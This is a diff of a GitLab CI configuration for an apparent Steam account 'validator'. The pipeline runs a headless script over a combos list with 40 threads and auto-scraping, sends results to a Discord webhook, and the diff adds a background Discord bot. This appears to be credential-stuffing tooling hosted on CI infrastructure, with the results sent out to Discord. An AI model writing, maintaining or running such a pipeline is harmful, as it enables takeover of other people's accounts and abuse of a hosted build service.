@@ -1,4 +1,4 @@
-﻿stages:
+stages:
   - run_validator
 
 variables:
@@ -15,8 +15,10 @@ run_104society_pipeline:
     - python -m pip install --upgrade pip
     - pip install -r requirements.txt || true
   script:
-    - echo "=== 104SOCIETY STEAM VALIDATOR — GITLAB ULTIMATE CI ==="
-    - python -c "import requests; print('Relay ping:', requests.post('$DISCORD_WEBHOOK_URL', json={'content':'⚡ **GitLab Ultimate CI Pipeline Aktif!**'}, timeout=10).status_code)" || true
+    - echo "=== 104SOCIETY STEAM VALIDATOR & DISCORD BOT — GITLAB ULTIMATE CI ==="
+    - python -c "import requests, os; w=os.environ.get('DISCORD_WEBHOOK_URL'); print('Ping status:', requests.post(w, json={'content':'⚡ **GitLab Ultimate CI Aktif! Discord Botu ve Kesintisiz Tarayıcı Bulutta Başlatıldı.**'}, timeout=10).status_code if w else 'No webhook')" || true
+    - python bot_104society.py &
+    - sleep 2
     - python headless.py --combos combos.txt --threads 40 --webhook "$DISCORD_WEBHOOK_URL" --auto-scrape --resume
   artifacts:
     name: "104Society_Results_$CI_COMMIT_SHORT_SHA"
